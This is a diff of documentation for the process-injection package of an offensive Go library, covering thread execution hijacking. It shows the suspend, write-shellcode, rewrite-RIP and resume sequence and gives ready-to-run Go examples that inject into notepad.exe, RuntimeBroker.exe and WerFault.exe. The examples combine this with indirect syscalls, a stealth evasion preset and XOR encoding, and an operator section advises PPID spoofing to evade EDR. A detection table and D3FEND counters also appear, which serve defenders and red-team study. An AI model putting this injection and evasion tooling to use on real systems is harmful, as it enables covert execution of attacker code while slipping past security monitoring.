@@ -1,155 +1,230 @@
-# Thread Execution Hijacking
+---
+package: github.com/oioio-space/maldev/inject
+last_reviewed: 2026-04-27
+reflects_commit: 4798780
+---
 
-> **MITRE ATT&CK:** T1055.003 -- Process Injection: Thread Execution Hijacking | **D3FEND:** D3-PSA -- Process Spawn Analysis | **Detection:** Medium
+# Thread execution hijacking
+
+[← injection index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Spawn a `CREATE_SUSPENDED` child, allocate + write + protect shellcode
+in its address space, then mutate its main thread's saved register
+state so `RIP` points at the shellcode before resuming. No new thread,
+no APC — the existing thread is **redirected** at the CPU-context
+level. Stealth tier: medium; the trade-off is a `NtSetContextThread`
+on a non-debugger flow, which EDR specifically watches.
 
 ## Primer
 
-Picture a runner in the middle of a race. You press a "freeze" button and the runner stops mid-stride. While they are frozen, you swap their destination card -- instead of running to the finish line, their card now says "run to the coffee shop." You press "unfreeze" and the runner continues running, but now they head to the coffee shop instead of the finish line, never realizing the switch happened.
+`CreateRemoteThread` creates a new thread; `EarlyBird` queues an APC.
+Thread Execution Hijacking does neither — it abuses the fact that
+Windows lets a debugger (or anything with `THREAD_GET_CONTEXT |
+THREAD_SET_CONTEXT`) pause a thread, read its full register file, edit
+the instruction pointer, write the registers back, and resume. The
+implant takes the same path: pause → read CONTEXT → write `Rip` to the
+shellcode address → write back → `ResumeThread`.
 
-Thread execution hijacking does exactly this to a thread in a target process. You create a suspended process, get the thread's context (which includes the instruction pointer -- the "destination card"), write your shellcode into the process's memory, change the instruction pointer to point at your shellcode, and resume the thread. The thread was going to execute the process entry point, but now it executes your shellcode first.
+The result is that the sacrificial child's main thread starts running
+at the shellcode address instead of the original entry point. No
+`Create*Thread*` event ever fires. The trade-off is the
+`NtSetContextThread` system call, which is unusual outside debugger
+workflows and is itself instrumented by every modern EDR.
 
-Unlike CreateRemoteThread, no new thread is created. Unlike Early Bird APC, no APC is queued. The existing thread is redirected at the CPU register level. This makes the technique harder for EDR to detect through thread-creation monitoring, though `SetThreadContext` calls are themselves monitored.
+The legacy alias `MethodProcessHollowing` points at this technique;
+**genuine PE hollowing** (overwriting the child's image with a different
+PE) is not implemented in this package.
 
-## How It Works
+## How it works
 
 ```mermaid
 sequenceDiagram
-    participant Attacker as Attacker Process
-    participant Kernel as Windows Kernel
-    participant Child as Child Process
+    participant Impl as Implant
+    participant Kern as Kernel
+    participant Child as Child (suspended)
 
-    Attacker->>Kernel: CreateProcess(SUSPENDED)
-    Kernel->>Child: Create process, freeze main thread
-    Kernel-->>Attacker: hProcess, hThread
+    Impl->>Kern: CreateProcess(CREATE_SUSPENDED)
+    Kern->>Child: process + main thread, frozen
+    Kern-->>Impl: hProcess, hThread
 
-    Attacker->>Kernel: NtAllocateVirtualMemory(hProcess, RW)
-    Kernel->>Child: Allocate memory
-    Kernel-->>Attacker: remoteAddr
+    Impl->>Kern: NtAllocateVirtualMemory(RW)
+    Impl->>Kern: NtWriteVirtualMemory(shellcode)
+    Impl->>Kern: NtProtectVirtualMemory(RX)
 
-    Attacker->>Kernel: NtWriteVirtualMemory(shellcode)
-    Kernel->>Child: Write shellcode
+    Impl->>Kern: NtGetContextThread(hThread)
+    Kern-->>Impl: CONTEXT (Rip = original entry)
 
-    Attacker->>Kernel: NtProtectVirtualMemory(RX)
-    Kernel->>Child: Make executable
+    Impl->>Impl: ctx.Rip = remoteAddr
+    Impl->>Kern: NtSetContextThread(hThread, ctx)
+    Kern->>Child: thread Rip rewritten
 
-    Attacker->>Kernel: NtGetContextThread(hThread)
-    Kernel-->>Attacker: CONTEXT (RIP = original entry point)
-
-    Attacker->>Attacker: ctx.RIP = remoteAddr
-
-    Attacker->>Kernel: NtSetContextThread(hThread, modified CONTEXT)
-    Kernel->>Child: Update thread registers
-
-    Attacker->>Kernel: ResumeThread(hThread)
-    Child->>Child: Thread runs at shellcode address
+    Impl->>Kern: ResumeThread(hThread)
+    Child->>Child: thread runs at shellcode address
 ```
 
-**Step-by-step:**
+Steps:
 
-1. **CreateProcess(CREATE_SUSPENDED)** -- Spawn a sacrificial process with its main thread frozen.
-2. **Allocate + Write** -- `NtAllocateVirtualMemory` (RW), `NtWriteVirtualMemory`, `NtProtectVirtualMemory` (RX) to place shellcode in the child.
-3. **NtGetContextThread** -- Read the thread's full register state, including the RIP (instruction pointer on x64).
-4. **Modify RIP** -- Set `ctx.Rip` to the address of the shellcode in remote memory.
-5. **NtSetContextThread** -- Write the modified context back, redirecting the thread.
-6. **ResumeThread** -- Resume execution. The thread starts at the shellcode address instead of the original entry point.
-
-## Usage
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    cfg := &inject.WindowsConfig{
-        Config: inject.Config{
-            Method:      inject.MethodThreadHijack,
-            ProcessPath: `C:\Windows\System32\notepad.exe`,
-        },
-    }
-    injector, err := inject.NewWindowsInjector(cfg)
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Combined Example
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/evasion"
-    "github.com/oioio-space/maldev/evasion/preset"
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // 1. Apply evasion.
-    evasion.ApplyAll(preset.Stealth(), nil)
-
-    // 2. Thread hijack with indirect syscalls.
-    injector, err := inject.Build().
-        Method(inject.MethodThreadHijack).
-        ProcessPath(`C:\Windows\System32\RuntimeBroker.exe`).
-        IndirectSyscalls().
-        Create()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Advantages & Limitations
-
-| Aspect | Detail |
-|--------|--------|
-| Stealth | Medium -- no new thread created, but `NtSetContextThread` is monitored by EDR. |
-| Thread creation | Zero. Existing thread is redirected. |
-| Execution guarantee | High -- the thread will execute at the new RIP when resumed. No alertable-wait dependency. |
-| Compatibility | x64 only in current implementation (uses `CONTEXT.Rip`). Windows 7+. |
-| Limitations | Requires `THREAD_GET_CONTEXT | THREAD_SET_CONTEXT` access. Creates a visible child process. The original entry point code never runs (process may appear broken if shellcode does not hand off). `NtSetContextThread` is a high-signal indicator for EDR. |
+1. **Spawn** the sacrificial child suspended.
+2. **Allocate / write / protect** the shellcode in the child.
+3. **Get** the main thread's CONTEXT (`NtGetContextThread`) — note
+   that the kernel returns the saved register file because the thread
+   is suspended.
+4. **Mutate** `ctx.Rip` (or `Eip` on x86) to the shellcode address.
+5. **Set** the modified CONTEXT back (`NtSetContextThread`).
+6. **Resume** the thread.
 
 ## API Reference
 
+### `Method = MethodThreadHijack`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#MethodThreadHijack)
+
+The constant `"threadhijack"`. Pass to `Config.Method` or
+`InjectorBuilder.Method`.
+
+### Legacy alias `MethodProcessHollowing`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#MethodProcessHollowing)
+
 ```go
-// Method constant
-const MethodThreadHijack Method = "threadhijack"
-
-// Legacy alias (deprecated)
 const MethodProcessHollowing = MethodThreadHijack
+```
 
-// Builder pattern
-injector, err := inject.Build().
+> [!WARNING]
+> The name is historical. This is **Thread Execution Hijacking**
+> (T1055.003), not PE Hollowing (T1055.012). Prefer
+> `MethodThreadHijack` in new code.
+
+### `WindowsConfig.ProcessPath`
+
+Path to the sacrificial child (default `notepad.exe`). Required for
+this method.
+
+### `inject.NewWindowsInjector(cfg *WindowsConfig) (Injector, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#NewWindowsInjector)
+
+### `Builder` pattern
+
+```go
+inj, err := inject.Build().
     Method(inject.MethodThreadHijack).
-    ProcessPath(`C:\Windows\System32\notepad.exe`).
+    ProcessPath(`C:\Windows\System32\RuntimeBroker.exe`).
     IndirectSyscalls().
     Create()
+```
 
-// Config pattern
+## Examples
+
+### Simple
+
+```go
 cfg := &inject.WindowsConfig{
     Config: inject.Config{
         Method:      inject.MethodThreadHijack,
         ProcessPath: `C:\Windows\System32\notepad.exe`,
     },
-    SyscallMethod: wsyscall.MethodIndirect,
 }
-injector, err := inject.NewWindowsInjector(cfg)
+inj, err := inject.NewWindowsInjector(cfg)
+if err != nil { return err }
+return inj.Inject(shellcode)
 ```
+
+### Composed (indirect syscalls, hardened sacrificial parent)
+
+```go
+inj, err := inject.Build().
+    Method(inject.MethodThreadHijack).
+    ProcessPath(`C:\Windows\System32\RuntimeBroker.exe`).
+    IndirectSyscalls().
+    Create()
+if err != nil { return err }
+return inj.Inject(shellcode)
+```
+
+### Advanced (preset evasion + thread hijack)
+
+```go
+import (
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/inject"
+)
+
+_ = evasion.ApplyAll(preset.Stealth(), nil)
+
+inj, err := inject.Build().
+    Method(inject.MethodThreadHijack).
+    ProcessPath(`C:\Windows\System32\WerFault.exe`).
+    IndirectSyscalls().
+    Use(inject.WithXORKey(0xA5)).
+    Create()
+if err != nil { return err }
+return inj.Inject(shellcode)
+```
+
+### Complex (Pipeline equivalent)
+
+`Pipeline` does not have a packaged `ThreadHijackExecutor` (it would
+need a saved CONTEXT and a thread handle); the named-method path is
+the supported one. For experimental setups, replicate the logic in
+[`inject/injector_remote_windows.go`](../../../inject/injector_remote_windows.go).
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| `CREATE_SUSPENDED` child of an unusual parent | Sysmon Event 1 (CreationFlags) |
+| `NtSetContextThread` on a thread of a freshly-spawned process | EDR-Ti providers, userland hooks. Outside debugger workflows this is a high-fidelity signal |
+| Cross-process `NtWriteVirtualMemory` | EDR userland + ETW |
+| Modified `Rip` in CONTEXT pointing into a non-image-backed region | EDR memory scanners on the child |
+| Process tree mismatch | `notepad.exe` child of a non-`explorer.exe` parent |
+
+**D3FEND counters:**
+
+- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
+  — `CREATE_SUSPENDED` + register mutation is the textbook hollowing-family chain.
+- [D3-PCSV](https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/)
+  — verifies thread `Rip` against image segments.
+
+**Hardening for the operator:** route NT calls through indirect
+syscalls; pair with PPID spoofing; choose a sacrificial process whose
+own initialisation does *not* race the shellcode (avoid heavyweight
+binaries that spawn workers immediately).
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055.003](https://attack.mitre.org/techniques/T1055/003/) | Process Injection: Thread Execution Hijacking | suspended-child variant | D3-PSA |
+
+## Limitations
+
+- **x64 only** in the current implementation (`CONTEXT.Rip`). x86
+  would need `Eip` and a different `CONTEXT` flags mask.
+- **Original entry point never runs.** The sacrificial process never
+  reaches its real `main`. If the shellcode does not hand control
+  back, the child appears to have started and immediately died — a
+  small but non-zero behavioural anomaly.
+- **`NtSetContextThread` is high-signal.** EDRs that miss the
+  `CREATE_SUSPENDED` flag still catch the context modification.
+  Direct/indirect syscalls help against userland hooks but not against
+  ETW-Ti.
+- **Race-prone for fast spawns.** Some sacrificial binaries
+  (`csrss.exe` adjacents, lightly-instrumented processes) finish
+  initial setup before `NtGetContextThread` returns. Stick to
+  well-behaved utilities.
+
+## See also
+
+- [Early Bird APC](early-bird-apc.md) — same suspended-child shape,
+  uses an APC instead of register mutation.
+- [CreateRemoteThread](create-remote-thread.md) — the loud baseline.
+- [Process Argument Spoofing](process-arg-spoofing.md) — pair to mask
+  the child's command line as a benign tool.
+- [`process/spoofparent`](../process/ppid-spoofing.md) — pair to set a
+  realistic parent for the sacrificial child.
+- [SafeBreach Labs, *Process Hollowing & Doppelgänging*, 2017](https://www.safebreach.com/blog/2017/12/safebreach-labs-discovers-doppelganging-stealth-injection/)
+  — taxonomy of register-mutation injection.
